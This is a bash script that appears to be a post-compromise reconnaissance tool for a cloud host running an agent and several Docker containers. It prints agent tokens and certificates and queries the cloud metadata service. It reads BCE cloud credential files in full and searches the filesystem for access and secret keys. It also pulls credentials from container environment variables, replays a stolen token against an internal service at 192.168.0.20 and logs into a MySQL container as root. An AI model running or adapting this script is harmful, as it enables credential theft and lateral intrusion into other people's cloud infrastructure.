#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
log "### START6 $(date -u +%FT%TZ)"
log "### BCM-TOKEN"; cat /opt/bcm-agent/conf/agent.config 2>/dev/null | head -20; ls -la /opt/bcm-agent/var/lib/bcm-agent/ 2>/dev/null | head -20
log "### BCM-CERT"; head -3 /opt/bcm-agent/var/lib/bcm-agent/cert.pem 2>/dev/null; openssl x509 -in /opt/bcm-agent/var/lib/bcm-agent/cert.pem -noout -subject -issuer -dates 2>/dev/null
log "### IMDS-BACKEND"
B=http://169.254.169.254
for p in /backend/meta-data/bcm_api_service_addr /backend/meta-data/tenant-id /backend/meta-data/instance-uuid /2009-04-04/meta-data/instance-shortid /2009-04-04/meta-data/instance-type-ex /2009-04-04/meta-data/instance-specs /backend/meta-data/ /2009-04-04/meta-data/; do
  log "-- $p"; timeout 6 curl -s -m 5 "$B$p" | head -c 400; echo
done
log "### BCE-KEYS"
for f in /root/.bce/credentials /root/.bce/config /etc/bce/credentials /root/.bcecli/credentials /root/.bcecmd/bcecmd.conf; do [ -f "$f" ] && { log "== $f"; cat "$f"; }; done
timeout 30 grep -rIl -E 'bce-auth-v1|ACCESS_KEY|SECRET_KEY|accessKeyId|secretAccessKey' /root /etc /opt /usr/local /data 2>/dev/null | head -10
log "### DOCKER-NPA"
for c in npa-bicm npa-management-java npa-client-java npa-bicm-mysql; do
  log "===== inspect $c"
  docker inspect $c --format '{{range .Config.Env}}{{println .}}{{end}}' 2>&1 | grep -viE 'PASSWORD=|SECRET=|TOKEN=|KEY=' | head -25
  log "--- creds-lines"
  docker inspect $c --format '{{range .Config.Env}}{{println .}}{{end}}' 2>&1 | grep -iE 'PASSWORD=|SECRET=|TOKEN=|KEY=|USER=|URL=|HOST=' | sed -E 's/(=.{4}).*/\1…sha8/' | head -20
  log "--- mounts"
  docker inspect $c --format '{{range .Mounts}}{{.Source}} -> {{.Destination}}{{println}}{{end}}' 2>&1 | head -10
done
log "### DOCKER-ALL-KEYS"
docker ps -q 2>/dev/null | while read id; do
  docker inspect $id --format '{{.Name}}' 2>/dev/null
done | head -30
log "### NPA-CFG-FILES"
for c in npa-bicm npa-management-java npa-client-java; do
  log "-- ls in $c"
  docker exec $c sh -c 'ls -la /app /opt 2>/dev/null | head -25' 2>&1 | head -30
done
log "### 8081-AUTH"
U=http://192.168.0.20:8081
T=$(cat /opt/bcm-agent/conf/agent.config 2>/dev/null | tr -d '\n' | head -c 200)
log "-- baseline"; timeout 6 curl -s -m 5 -o /dev/null -w "%{http_code}\n" $U/
log "-- bearer agent.config"; timeout 6 curl -s -m 5 -H "Authorization: Bearer $T" -o /dev/null -w "%{http_code}\n" $U/
log "-- X-Token"; timeout 6 curl -s -m 5 -H "X-Token: $T" -o /dev/null -w "%{http_code}\n" $U/
log "-- X-Auth-Token"; timeout 6 curl -s -m 5 -H "X-Auth-Token: $T" -o /dev/null -w "%{http_code}\n" $U/
log "-- body"; timeout 6 curl -s -m 5 -X POST -H 'Content-Type: application/json' -d '{"action":"list"}' $U/ | head -c 200; echo
log "### MYSQL-BICM"
docker exec npa-bicm-mysql sh -c 'mysql -uroot -p"$MYSQL_ROOT_PASSWORD" -N -e "show databases;" 2>/dev/null' 2>&1 | head -20
log "### DONE6 $(date -u +%FT%TZ)"
